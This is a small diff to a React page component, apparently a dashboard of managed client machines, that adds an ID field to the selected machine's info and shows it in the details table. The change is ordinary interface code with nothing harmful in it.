@@ -131,6 +131,7 @@ const SlavesPage = () => {
         const slave = slaves[index];
         setInfoSlave({
             index: index,
+            id: slave.id,
             computername: slave.computername,
             os: slave.os,
             nickname: slave.nickname,
@@ -159,6 +160,10 @@ const SlavesPage = () => {
                 <h4>Slave:</h4>
                 <Table size="sm">
                 <tbody>
+                    <tr>
+                        <th>ID</th>
+                        <td>{infoSlave.id}</td>
+                    </tr>
                     <tr>
                         <th>Computername</th>
                         <td>{infoSlave.computername}</td>
